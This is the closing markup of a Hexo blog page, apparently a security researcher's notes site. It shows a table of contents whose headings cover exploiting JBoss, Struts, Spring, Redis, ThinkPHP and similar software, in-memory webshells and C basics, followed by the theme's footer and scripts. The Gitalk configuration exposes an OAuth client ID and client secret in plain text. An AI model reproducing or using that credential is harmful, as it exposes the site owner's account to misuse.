class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87waf%E6%89%A7%E8%A1%8C"><span class="toc-number">2.5.2.</span> <span class="toc-text">绕过waf执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JBoss"><span class="toc-number">2.6.</span> <span class="toc-text">JBoss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts"><span class="toc-number">2.7.</span> <span class="toc-text">Struts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring"><span class="toc-number">2.8.</span> <span class="toc-text">Spring</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis"><span class="toc-number">2.9.</span> <span class="toc-text">Redis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ThinkPHP"><span class="toc-number">2.10.</span> <span class="toc-text">ThinkPHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vcenter"><span class="toc-number">2.11.</span> <span class="toc-text">Vcenter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CommonCollections"><span class="toc-number">2.12.</span> <span class="toc-text">CommonCollections</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CC1"><span class="toc-number">2.12.1.</span> <span class="toc-text">CC1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#e-cology"><span class="toc-number">2.13.</span> <span class="toc-text">e-cology</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9B%B8%E5%85%B3"><span class="toc-number">3.</span> <span class="toc-text">内存马相关</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Servlet%E5%AE%B9%E5%99%A8%E4%B8%8EEngine%E3%80%81Host%E3%80%81Context%E5%92%8CWrapper"><span class="toc-number">3.1.</span> <span class="toc-text">Servlet容器与Engine、Host、Context和Wrapper</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#servlet%E6%B5%8B%E8%AF%95"><span class="toc-number">3.2.</span> <span class="toc-text">servlet测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E7%9C%8Bservlet%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%8E%E8%A3%85%E8%BD%BD%E6%B5%81%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">从代码层面看servlet初始化与装载流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#servlet%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.3.1.</span> <span class="toc-text">servlet流程分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86"><span class="toc-number">4.</span> <span class="toc-text">前端加密</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D%E9%98%B2%E7%AF%A1%E6%94%B9"><span class="toc-number">4.1.</span> <span class="toc-text">验证签名防篡改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFJS%E5%8A%A0%E5%AF%86%E8%A1%A8%E5%8D%95"><span class="toc-number">4.2.</span> <span class="toc-text">前端JS加密表单</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8Fhook"><span class="toc-number">5.</span> <span class="toc-text">微信小程序hook</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E5%9C%B0%E5%9D%80%E6%9F%A5%E6%89%BE"><span class="toc-number">5.1.</span> <span class="toc-text">基地址查找</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%8F%E7%A7%BB%E9%87%8F%E8%AE%A1%E7%AE%97"><span class="toc-number">5.2.</span> <span class="toc-text">偏移量计算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81"><span class="toc-number">5.3.</span> <span class="toc-text">验证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#C%E8%AF%AD%E8%A8%80"><span class="toc-number">6.</span> <span class="toc-text">C语言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2"><span class="toc-number">6.1.</span> <span class="toc-text">自动类型转换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%93%E5%87%BA"><span class="toc-number">6.2.</span> <span class="toc-text">输出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E9%BD%90%E8%BE%93%E5%87%BA"><span class="toc-number">6.2.1.</span> <span class="toc-text">对齐输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E5%92%8CLinux%E7%9A%84%E8%BE%93%E5%87%BA%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6"><span class="toc-number">6.2.2.</span> <span class="toc-text">Windows和Linux的输出缓存机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows"><span class="toc-number">6.2.2.1.</span> <span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux"><span class="toc-number">6.2.2.2.</span> <span class="toc-text">Linux</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%93%E5%85%A5"><span class="toc-number">6.3.</span> <span class="toc-text">输入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E4%B8%AD%E5%AD%98%E6%94%BE%E7%9A%84%E6%A0%BC%E5%BC%8F"><span class="toc-number">6.3.0.1.</span> <span class="toc-text">内存中存放的格式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">6.3.0.2.</span> <span class="toc-text">输入与缓冲区的关系</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E5%AD%97%E7%AC%A6%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%89%80%E6%9C%89%E5%87%BD%E6%95%B0%E6%B1%87%E6%80%BB"><span class="toc-number">6.3.0.3.</span> <span class="toc-text">输入字符和字符串所有函数汇总</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E5%8D%95%E4%B8%AA%E5%AD%97%E7%AC%A6"><span class="toc-number">6.3.0.4.</span> <span class="toc-text">输入单个字符</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#getchar"><span class="toc-number">6.3.0.4.1.</span> <span class="toc-text">getchar()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#getche-%EF%BC%9Awindows%E7%89%B9%E6%9C%89%E5%87%BD%E6%95%B0"><span class="toc-number">6.3.0.4.2.</span> <span class="toc-text">getche()：windows特有函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#getche-%EF%BC%9AWindows%E7%89%B9%E6%9C%89%E5%87%BD%E6%95%B0"><span class="toc-number">6.3.0.4.3.</span> <span class="toc-text">getche()：Windows特有函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.3.0.4.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">6.3.0.5.</span> <span class="toc-text">输入字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#gets"><span class="toc-number">6.3.0.5.1.</span> <span class="toc-text">gets()</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E7%BB%84"><span class="toc-number">6.4.</span> <span class="toc-text">数组</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E7%9A%84%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84"><span class="toc-number">6.4.1.</span> <span class="toc-text">数组的内存结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="toc-number">6.4.2.</span> <span class="toc-text">初始化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%95%B0%E7%BB%84%E4%B8%AD%E6%98%AF%E5%90%A6%E5%8C%85%E5%90%AB%E6%9F%90%E4%B8%AA%E5%85%83%E7%B4%A0"><span class="toc-number">6.4.3.</span> <span class="toc-text">判断数组中是否包含某个元素</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%BA%8F%E6%95%B0%E7%BB%84%E6%9F%A5%E8%AF%A2"><span class="toc-number">6.4.3.1.</span> <span class="toc-text">无序数组查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E6%9F%A5%E8%AF%A2"><span class="toc-number">6.4.3.2.</span> <span class="toc-text">有序数组查询</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E6%95%B0%E7%BB%84%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%AF%A6%E8%A7%A3"><span class="toc-number">6.4.4.</span> <span class="toc-text">字符数组和字符串详解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%93%E6%9D%9F%E6%A0%87%E5%BF%97"><span class="toc-number">6.4.5.</span> <span class="toc-text">字符串结束标志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%95%BF%E5%BA%A6"><span class="toc-number">6.4.6.</span> <span class="toc-text">字符串长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA"><span class="toc-number">6.4.7.</span> <span class="toc-text">字符串输入输出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E5%AE%9E-scanf-%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%AF%BB%E5%8F%96%E5%B8%A6%E7%A9%BA%E6%A0%BC%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">6.4.7.1.</span> <span class="toc-text">其实 scanf() 也可以读取带空格的字符串</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C%E8%AF%AD%E8%A8%80%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0"><span class="toc-number">6.4.8.</span> <span class="toc-text">C语言字符串处理函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5%E5%87%BD%E6%95%B0-strcat"><span class="toc-number">6.4.8.1.</span> <span class="toc-text">字符串连接函数 strcat()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%8D%E5%88%B6%E5%87%BD%E6%95%B0-strcpy"><span class="toc-number">6.4.8.2.</span> <span class="toc-text">字符串复制函数 strcpy()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%AF%94%E8%BE%83%E5%87%BD%E6%95%B0-strcmp"><span class="toc-number">6.4.8.3.</span> <span class="toc-text">字符串比较函数 strcmp()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0"><span class="toc-number">6.5.</span> <span class="toc-text">C语言函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%93%E5%87%BD%E6%95%B0%E5%92%8C%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0"><span class="toc-number">6.5.1.</span> <span class="toc-text">库函数和自定义函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C%E8%AF%AD%E8%A8%80%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%92%8C%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F"><span class="toc-number">6.5.2.</span> <span class="toc-text">C语言全局变量和局部变量</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F"><span class="toc-number">6.5.2.1.</span> <span class="toc-text">局部变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">6.5.2.2.</span> <span class="toc-text">全局变量</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8%E5%9F%9F"><span class="toc-number">6.5.3.</span> <span class="toc-text">作用域</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E5%91%BD%E5%90%8D"><span class="toc-number">6.5.3.1.</span> <span class="toc-text">变量命名</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%97%E7%BA%A7%E5%8F%98%E9%87%8F"><span class="toc-number">6.5.4.</span> <span class="toc-text">块级变量</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#for%E5%BE%AA%E7%8E%AF%E5%86%85%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F"><span class="toc-number">6.5.4.1.</span> <span class="toc-text">for循环内定义变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E7%8B%AC%E7%9A%84%E4%BB%A3%E7%A0%81%E5%9D%97"><span class="toc-number">6.5.4.2.</span> <span class="toc-text">单独的代码块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%8D%E8%B0%88%E4%BD%9C%E7%94%A8%E5%9F%9F"><span class="toc-number">6.5.4.3.</span> <span class="toc-text">再谈作用域</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%92%E5%BD%92%E5%87%BD%E6%95%B0"><span class="toc-number">6.5.5.</span> <span class="toc-text">递归函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B1%82%E9%98%B6%E4%B9%98"><span class="toc-number">6.5.5.1.</span> <span class="toc-text">求阶乘</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%92%E5%BD%92%E7%9A%84%E8%BF%9B%E5%85%A5"><span class="toc-number">6.5.5.1.1.</span> <span class="toc-text">递归的进入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%92%E5%BD%92%E7%9A%84%E9%80%80%E5%87%BA"><span class="toc-number">6.5.5.1.2.</span> <span class="toc-text">递归的退出</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%92%E5%BD%92%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">6.5.5.2.</span> <span class="toc-text">递归的条件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C%E8%AF%AD%E8%A8%80%E9%A2%84%E5%A4%84%E7%90%86%E5%91%BD%E4%BB%A4"><span class="toc-number">6.6.</span> <span class="toc-text">C语言预处理命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E5%A4%84%E7%90%86%E5%91%BD%E4%BB%A4%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">6.6.1.</span> <span class="toc-text">预处理命令是什么</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">7.</span> <span class="toc-text">软件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduce"><span class="toc-number">7.1.</span> <span class="toc-text">Introduce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E9%9D%A0%E6%80%A7%E7%9A%84%E5%BF%85%E8%A6%81%E6%80%A7%EF%BC%88soundness%EF%BC%89"><span class="toc-number">7.1.1.</span> <span class="toc-text">可靠性的必要性（soundness）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">7.1.2.</span> <span class="toc-text">静态分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Static-Analysis-Abstraction-Overapproximation"><span class="toc-number">7.1.3.</span> <span class="toc-text">Static Analysis &#x3D; Abstraction + Overapproximation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%BD%E8%B1%A1%EF%BC%88Abstraction%EF%BC%89"><span class="toc-number">7.1.3.1.</span> <span class="toc-text">抽象（Abstraction）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Overapproximate%EF%BC%9ATransfer-Function%EF%BC%88%E8%BF%87%E5%BA%A6%E8%BF%91%E4%BC%BC%EF%BC%9A%E5%87%BD%E6%95%B0%E8%BD%AC%E5%8C%96%EF%BC%89"><span class="toc-number">7.1.3.2.</span> <span class="toc-text">Overapproximate：Transfer Function（过度近似：函数转化）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Overapproximate%EF%BC%9AControl-Flow%EF%BC%88%E6%8E%A7%E5%88%B6%E6%B5%81%EF%BC%89"><span class="toc-number">7.1.3.3.</span> <span class="toc-text">Overapproximate：Control Flow（控制流）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Intermediate-Representation%EF%BC%88IR%EF%BC%89"><span class="toc-number">7.2.</span> <span class="toc-text">Intermediate Representation（IR）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Compiler%EF%BC%88%E7%BC%96%E8%AF%91%E5%99%A8%EF%BC%89"><span class="toc-number">7.2.1.</span> <span class="toc-text">Compiler（编译器）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AST-vs-IR"><span class="toc-number">7.2.2.</span> <span class="toc-text">AST vs. IR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Address-Code%EF%BC%883AC%EF%BC%89"><span class="toc-number">7.2.3.</span> <span class="toc-text">3-Address Code（3AC）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%843AC%E8%A1%A8"><span class="toc-number">7.2.4.</span> <span class="toc-text">常见的3AC表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Soot-and-Its-IR%EF%BC%9AJimple"><span class="toc-number">7.2.5.</span> <span class="toc-text">Soot and Its IR：Jimple</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#For-Loop"><span class="toc-number">7.2.5.1.</span> <span class="toc-text">For Loop</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Do-While-Loop"><span class="toc-number">7.2.5.2.</span> <span class="toc-text">Do-While Loop</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Method-Call"><span class="toc-number">7.2.5.3.</span> <span class="toc-text">Method Call</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2017 - 2025 By Y5neKO</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">行走于黑白之间.</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><script>(() => {
  const initGitalk = () => {
    const gitalk = new Gitalk(Object.assign({
      clientID: '4d2d58bafea4c026b68f',
      clientSecret: '61a3976d66520d7bfd80d2de0e9e60fe31820603',
      repo: 'y5neko.github.io',
      owner: 'Y5neKO',
      admin: ['Y5neKO'],
      id: '2e44f9084260102570f3d30612cfd8d5',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  const loadGitalk = async() => {
    if (typeof Gitalk === 'function') initGitalk()
    else {
      await getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
      await getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js')
      initGitalk()
    }
  }
  
  const commentCount = n => {
    const isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
    if (isCommentCount) {
      isCommentCount.textContent= n
    }
  }

  if ('Gitalk' === 'Gitalk' || !false) {
    if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
    else loadGitalk()
  } else {
    window.loadOtherComment = loadGitalk
  }
})()</script></div><div class="aplayer no-destroy" data-id="2102314888" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true" data-mini="true"> </div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener
  btf.removeGlobalFnEvent('pjax')
  btf.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>